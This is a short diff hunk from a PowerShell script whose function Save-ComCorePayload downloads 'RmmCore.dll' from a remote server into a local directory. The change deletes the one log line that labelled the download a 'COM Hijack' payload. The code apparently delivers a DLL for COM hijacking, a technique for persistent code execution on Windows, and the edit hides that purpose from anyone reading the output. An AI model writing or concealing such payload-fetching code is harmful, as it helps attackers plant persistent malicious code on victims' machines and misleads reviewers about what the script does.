@@ -212,7 +212,6 @@ function Save-ComCorePayload {
         [Parameter(Mandatory = $true)][string]$Dir
     )
     $dest = Join-Path $Dir 'RmmCore.dll'
-    Write-Host "GET RmmCore.dll (COM Hijack — so o core)"
     Save-RemoteFile -Uri "$ServerBase/download/RmmCore.dll" -Dest $dest -UnlockExplorer
 }
 
